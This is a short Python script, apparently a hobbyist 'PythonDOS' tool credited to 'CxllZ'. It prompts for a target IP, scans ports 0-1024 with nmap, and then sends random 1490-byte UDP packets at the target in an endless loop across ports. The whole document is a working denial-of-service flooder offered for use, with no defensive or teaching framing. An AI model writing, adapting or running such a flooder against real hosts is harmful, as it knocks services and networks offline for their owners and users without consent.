import sys
import os
import nmap
import time
import socket
import random
import pyfiglet

ascii_banner = pyfiglet.figlet_format("ViewBot")
print(ascii_banner)
print("					By CxllZ")

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("cls")
ascii_banner = pyfiglet.figlet_format("PythonDOS")
print(ascii_banner)
print("					By CxllZ")
print
print ("Author   : CxllZ")
print ("Socials  : https://bit.ly/2Er2Sni")
print ()
ip = input ("IP Target : ")
print ("nmap is scanning ip for open ports please wait a few seconds")
print ()

#nmap port scanner so they know what ports to use
nm = nmap.PortScanner()
nm.scan(ip, '0-1024')
for host in nm.all_hosts():
    print('----------------------------------------------------')
    print('Host : {} ({})'.format(ip, nm[ip].hostname()))
    print('State : {}'.format(nm[ip].state()))
    for proto in nm[ip].all_protocols():
        print('----------')
        print('Protocol : {}'.format(proto))
 
        lport = nm[ip][proto].keys()
        for port in lport:
            print ('port : {}\tstate : {}'.format(port, nm[ip][proto][port]['state']))

print ()
print ("no results or says 'host down' but you know its online? just use port 80")
print ()
port = input ("Port : ")

os.system("cls")
os.system("clear")
ascii_banner = pyfiglet.figlet_format("AttackStarting!")
print(ascii_banner)
print ("[                    ] 0% ")
time.sleep(1)
print ("[=====               ] 25%")
time.sleep(1)
print ("[==========          ] 50%")
time.sleep(1)
print ("[===============     ] 75%")
time.sleep(1)
print ("[====================] 100%")
time.sleep(2)
sent = 0

while True:
     sock.sendto(bytes, (ip, int(port)))
     sent = int(sent) + 1
     port = int(port) + 1
     print ("Sent %s packets to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
